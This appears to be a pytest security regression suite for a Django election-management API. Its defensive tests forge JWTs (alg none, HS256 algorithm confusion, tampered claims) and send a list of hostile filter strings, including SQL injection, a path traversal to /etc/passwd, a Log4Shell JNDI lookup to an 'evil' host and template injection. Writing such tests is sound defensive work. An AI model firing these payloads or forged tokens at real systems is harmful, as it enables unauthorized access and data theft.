"""Hardening regressions (SEC-01 - SEC-08, PB-11): token forgery, the API boundary, and the
shape of failures. These exist so a refactor cannot quietly reopen a closed door."""

import base64
import hashlib
import hmac
import json
import time
from datetime import timedelta

import jwt
import pytest
from django.conf import settings
from django.utils import timezone
from rest_framework.test import APIClient

from apps.accounts.services.sessions import start_session
from apps.core.domain.permissions import Role

pytestmark = pytest.mark.django_db


@pytest.fixture
def member(make_member, make_org):
    return make_member(Role.PARTY_ADMIN, organization=make_org("Hardening Party"))


@pytest.fixture
def good_token(member):
    session = start_session(
        user=member.user,
        membership=member.membership,
        client="WEB",
        mfa_at=timezone.now(),
        ip=None,
    )
    return session.access_token


def _claims(token: str) -> dict:
    return jwt.decode(token, options={"verify_signature": False})


def _get_me(token: str, **headers):
    client = APIClient()
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")
    return client.get("/api/v1/me", **headers)


def _b64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# --- Token forgery ----------------------------------------------------------------------------


def test_a_genuine_token_works(good_token):
    assert _get_me(good_token).status_code == 200


def test_alg_none_is_refused(good_token):
    forged = jwt.encode(_claims(good_token), key="", algorithm="none")
    assert _get_me(forged).status_code == 401


def test_algorithm_confusion_with_the_public_key_is_refused(good_token):
    """An HS256 token MAC'd with the public key as the secret must not verify."""
    header = jwt.get_unverified_header(good_token)
    forged_header = {"alg": "HS256", "typ": "JWT", "kid": header.get("kid")}
    payload = _claims(good_token)
    signing_input = (
        f"{_b64(json.dumps(forged_header).encode())}.{_b64(json.dumps(payload).encode())}"
    )
    public = next(iter(settings.VTRS_JWT_PUBLIC_KEYS.values()), "") or "public-key-bytes"
    signature = hmac.new(public.encode(), signing_input.encode(), hashlib.sha256).digest()
    assert _get_me(f"{signing_input}.{_b64(signature)}").status_code == 401


def test_a_tampered_payload_is_refused(good_token):
    head, body, signature = good_token.split(".")
    claims = json.loads(base64.urlsafe_b64decode(body + "=" * (-len(body) % 4)))
    claims["org"] = "00000000-0000-0000-0000-000000000000"
    forged_body = _b64(json.dumps(claims).encode())
    assert _get_me(f"{head}.{forged_body}.{signature}").status_code == 401


def test_a_stripped_signature_is_refused(good_token):
    head, body, _ = good_token.split(".")
    assert _get_me(f"{head}.{body}.").status_code == 401
    assert _get_me(f"{head}.{body}").status_code == 401


def _resign(good_token: str, **changes) -> str:
    """A token with a *valid* signature but different claims, as a leaked key would allow."""
    claims = {**_claims(good_token), **changes}
    kid = jwt.get_unverified_header(good_token).get("kid")
    return jwt.encode(
        claims, settings.VTRS_JWT_PRIVATE_KEY, algorithm="EdDSA", headers={"kid": kid}
    )


def test_wrong_audience_issuer_and_expiry_are_refused(good_token):
    assert _get_me(_resign(good_token)).status_code == 200  # the control: same claims verify
    assert _get_me(_resign(good_token, aud="somewhere-else")).status_code == 401
    assert _get_me(_resign(good_token, iss="someone-else")).status_code == 401
    assert _get_me(_resign(good_token, exp=int(time.time()) - 60)).status_code == 401


def test_an_unknown_signing_key_id_is_refused(good_token):
    claims = _claims(good_token)
    forged = jwt.encode(
        claims, settings.VTRS_JWT_PRIVATE_KEY, algorithm="EdDSA", headers={"kid": "k-unknown"}
    )
    assert _get_me(forged).status_code == 401


@pytest.mark.parametrize("value", ["", "Bearer", "Bearer a b", "Basic abc", "bearer", "Token xyz"])
def test_malformed_authorization_headers_are_401_not_500(value):
    client = APIClient()
    response = client.get("/api/v1/me", HTTP_AUTHORIZATION=value)
    assert response.status_code == 401


# --- The API boundary ---------------------------------------------------------------------------


def test_api_responses_are_never_cached_and_cannot_be_rendered(good_token):
    response = _get_me(good_token)
    assert response["Cache-Control"] == "no-store"
    assert response["X-Content-Type-Options"] == "nosniff"
    assert "default-src 'none'" in response["Content-Security-Policy"]
    assert response["X-Request-ID"]


def test_cors_allows_only_configured_origins(settings, good_token):
    settings.VTRS_CORS_ALLOWED_ORIGINS = ["https://portal.example.org"]
    client = APIClient()
    preflight = client.options(
        "/api/v1/me",
        HTTP_ORIGIN="https://portal.example.org",
        HTTP_ACCESS_CONTROL_REQUEST_METHOD="GET",
        HTTP_ACCESS_CONTROL_REQUEST_HEADERS="authorization,idempotency-key",
    )
    assert preflight.status_code == 204
    assert preflight["Access-Control-Allow-Origin"] == "https://portal.example.org"
    assert "Idempotency-Key" in preflight["Access-Control-Allow-Headers"]
    assert "Access-Control-Allow-Credentials" not in preflight  # bearer tokens, not cookies
    assert preflight["Vary"] == "Origin"

    foreign = client.options(
        "/api/v1/me",
        HTTP_ORIGIN="https://evil.example.net",
        HTTP_ACCESS_CONTROL_REQUEST_METHOD="GET",
    )
    assert "Access-Control-Allow-Origin" not in foreign

    ok = _get_me(good_token, HTTP_ORIGIN="https://portal.example.org")
    assert ok["Access-Control-Allow-Origin"] == "https://portal.example.org"
    assert "ETag" in ok["Access-Control-Expose-Headers"]
    other = _get_me(good_token, HTTP_ORIGIN="https://evil.example.net")
    assert "Access-Control-Allow-Origin" not in other


def test_no_origin_is_allowed_by_default(good_token):
    response = _get_me(good_token, HTTP_ORIGIN="https://portal.example.org")
    assert "Access-Control-Allow-Origin" not in response


# --- Shape of failures --------------------------------------------------------------------------


def test_malformed_json_is_a_clean_400(good_token):
    client = APIClient()
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {good_token}")
    response = client.post("/api/v1/elections", data="{not json", content_type="application/json")
    assert response.status_code == 400
    assert response["Content-Type"].startswith("application/problem+json")


def test_the_wrong_content_type_is_a_415(good_token):
    client = APIClient()
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {good_token}")
    response = client.post("/api/v1/elections", data="a=b", content_type="text/plain")
    assert response.status_code == 415


def test_an_oversized_body_is_refused_without_a_server_error(good_token):
    client = APIClient()
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {good_token}")
    big = json.dumps({"name": "x" * (3 * 1024 * 1024)})
    response = client.post("/api/v1/elections", data=big, content_type="application/json")
    assert 400 <= response.status_code < 500


def test_an_unexpected_error_does_not_leak_internals(good_token, monkeypatch):
    from apps.elections import selectors

    def boom(*args, **kwargs):
        raise RuntimeError("secret detail: /srv/app/keys/private.pem")

    monkeypatch.setattr(selectors, "elections_for", boom)
    client = APIClient(raise_request_exception=False)
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {good_token}")
    response = client.get("/api/v1/elections")
    assert response.status_code == 500
    text = response.content.decode()
    assert "secret detail" not in text and "private.pem" not in text and "Traceback" not in text
    assert response.json()["request_id"]


@pytest.mark.parametrize(
    "payload",
    [
        "' OR '1'='1",
        "'; DROP TABLE election; --",
        "%' UNION SELECT NULL--",
        "\x00",
        "../../etc/passwd",
        "${jndi:ldap://evil/x}",
        "{{7*7}}",
        "a" * 5000,
    ],
)
@pytest.mark.parametrize(
    "path",
    [
        "/api/v1/audit/events?action={}",
        "/api/v1/audit/events?object_type={}",
        "/api/v1/audit/events?object_id={}",
        "/api/v1/users?q={}",
        "/api/v1/geography/polling-units?q={}",
        "/api/v1/exports?status={}",
    ],
)
def test_hostile_strings_in_filters_never_cause_a_server_error(good_token, path, payload):
    from urllib.parse import quote

    client = APIClient()
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {good_token}")
    response = client.get(path.format(quote(payload, safe="")))
    assert response.status_code < 500, response.content


def test_protected_routes_answer_401_to_strangers():
    client = APIClient()
    for path in (
        "/api/v1/me",
        "/api/v1/elections",
        "/api/v1/exports",
        "/api/v1/audit/events",
        "/api/v1/admin/health",
        "/api/v1/me/notifications",
    ):
        response = client.get(path)
        assert response.status_code == 401, path
        assert response["WWW-Authenticate"].startswith("Bearer")


def test_an_expired_access_token_is_refused(good_token):
    expired = _resign(good_token, exp=int((timezone.now() - timedelta(minutes=1)).timestamp()))
    response = _get_me(expired)
    assert response.status_code == 401
    assert response.json()["code"] == "invalid_token"
